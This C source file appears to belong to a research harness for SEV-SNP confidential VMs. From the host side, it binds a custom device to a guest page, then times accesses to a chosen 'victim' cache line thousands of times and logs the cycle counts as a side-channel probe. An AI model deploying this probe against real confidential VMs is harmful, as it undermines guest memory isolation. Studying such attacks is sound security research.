#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

#define HOST_RUNNER_PRELOAD 1
#include "../host_runner_preload_shared.h"

static int wait_next_log_line_local(const char *log_path, uint64_t *off,
                                    char *buf, size_t buf_sz,
                                    double timeout_s) {
  struct timespec ts;
  uint64_t deadline_ns;

  clock_gettime(CLOCK_MONOTONIC, &ts);
  deadline_ns = (uint64_t)ts.tv_sec * 1000000000ULL + (uint64_t)ts.tv_nsec +
                (uint64_t)(timeout_s * 1e9);

  for (;;) {
    int fd = open(log_path, O_RDONLY);
    if (fd >= 0) {
      ssize_t n = pread(fd, buf, buf_sz - 1, (off_t)*off);
      close(fd);
      if (n > 0) {
        char *nl;
        buf[n] = '\0';
        nl = strchr(buf, '\n');
        if (nl) {
          *nl = '\0';
          *off += (uint64_t)(nl - buf) + 1ULL;
          return 0;
        }
      }
    }
    clock_gettime(CLOCK_MONOTONIC, &ts);
    if ((uint64_t)ts.tv_sec * 1000000000ULL + (uint64_t)ts.tv_nsec >=
        deadline_ns)
      return -1;
    usleep(50);
  }
}

static int parse_hex_after_key_local(const char *line, const char *key,
                                     uint64_t *out) {
  const char *p = strstr(line, key);
  unsigned long long v = 0;
  if (!p)
    return -1;
  if (sscanf(p + strlen(key), "%llx", &v) != 1)
    return -1;
  *out = (uint64_t)v;
  return 0;
}

static int wait_probe_blind_local(const char *sync_log, uint64_t *off,
                                  uint64_t *target_gpa,
                                  uint64_t *other_page_gpa) {
  char line[512];
  for (;;) {
    if (wait_next_log_line_local(sync_log, off, line, sizeof(line), 60.0) != 0)
      return -1;
    if (strstr(line, "SNP_PROBE BLIND") == NULL)
      continue;
    if (parse_hex_after_key_local(line, "target_gpa=0x", target_gpa) != 0)
      continue;
    if (parse_hex_after_key_local(line, "other_page_gpa=0x", other_page_gpa) !=
        0)
      continue;
    return 0;
  }
}

void *hr_mode_blind_impl(void *arg) {
  const char *outdir = getenv("HR_OUTDIR");
  const char *sync_log = getenv("HR_SYNC_LOG");
  const char *env;
  int reps = 20000;
  int cpu = -1;
  int victim_line = 0;
  uint32_t reader_mode = HPA_READER_MODE_CIPHERTEXT_CACHEABLE;
  uint64_t target_gpa = 0, other_gpa = 0;
  uint64_t log_off = 0;
  int vm_fd = -1;
  struct hr_reader_ctx reader = {.fd = -1};
  FILE *rf = NULL, *meta = NULL;
  char meta_path[512];
  uint64_t target_hpa = 0;
  unsigned raw_pending = 0;

  (void)arg;
  if (!outdir || !sync_log)
    return NULL;
  if ((env = getenv("HR_REPS")))
    reps = atoi(env);
  if ((env = getenv("HR_CPU")))
    cpu = atoi(env);
  if ((env = getenv("HR_VICTIM_LINE")))
    victim_line = atoi(env);

  wait_file_exists(sync_log);
  if (wait_probe_blind_local(sync_log, &log_off, &target_gpa, &other_gpa) != 0)
    return NULL;

  maybe_pin_cpu(cpu);
  for (int i = 0; i < 50; i++) {
    vm_fd = find_self_kvm_vm_fd();
    if (vm_fd >= 0)
      break;
    usleep(100000);
  }
  if (vm_fd < 0)
    return NULL;

  if (hr_reader_open(&reader) != 0) {
    fprintf(stderr, "[HR/blind] open %s failed: errno=%d (%s)\n",
            HPA_READER_DEV, errno, strerror(errno));
    goto done;
  }
  if (hr_reader_bind(&reader, vm_fd, target_gpa, reader_mode) != 0) {
    fprintf(stderr,
            "[HR/blind] hr_reader_bind failed: target_gpa=0x%llx mode=%u errno=%d (%s)\n",
            (unsigned long long)target_gpa, reader_mode, errno, strerror(errno));
    goto done;
  }
  target_hpa = reader.page_hpa;

  if (ensure_dir_p(outdir) != 0)
    goto done;

  {
    char rf_path[512];
    const char *raw_file = getenv("HR_RAW_FILE");
    snprintf(rf_path, sizeof(rf_path), "%s/raw_cycles.csv",
             raw_file ? "" : outdir);
    rf = fopen(raw_file ? raw_file : rf_path, "w");
    if (!rf)
      goto done;
    fprintf(rf, "cycles\n");
    fflush(rf);
  }

  snprintf(meta_path, sizeof(meta_path), "%s/meta.txt", outdir);
  meta = fopen(meta_path, "w");

  for (int i = 0; i < 200; i++) {
    uint64_t warm = 0;
    (void)hr_reader_measure_line(&reader, victim_line, &warm);
  }

  for (int rep = 0; rep < reps; rep++) {
    uint64_t cycles = 0;
    if (hr_reader_measure_line(&reader, victim_line, &cycles) != 0) {
      fprintf(stderr,
              "[HR/blind] hr_reader_measure_line failed: line=%d errno=%d (%s)\n",
              victim_line, errno, strerror(errno));
      goto done;
    }
    if (cycles == 0)
      cycles = 9999;
    fprintf(rf, "%llu\n", (unsigned long long)cycles);
    if (++raw_pending >= 256) {
      fflush(rf);
      raw_pending = 0;
    }
  }
  if (raw_pending > 0)
    fflush(rf);

  if (meta) {
    fprintf(meta,
            "target_gpa=0x%llx\n"
            "target_hpa=0x%llx\n"
            "victim_line=%d\n"
            "mode=blind-concurrent\n"
            "reps=%d\n",
            (unsigned long long)target_gpa, (unsigned long long)target_hpa,
            victim_line, reps);
  }

done:
  hr_reader_close(&reader);
  if (rf)
    fclose(rf);
  if (meta)
    fclose(meta);
  if (vm_fd >= 0)
    close(vm_fd);
  return NULL;
}

void *hr_main_thread_blind(void *arg) { return hr_mode_blind_impl(arg); }
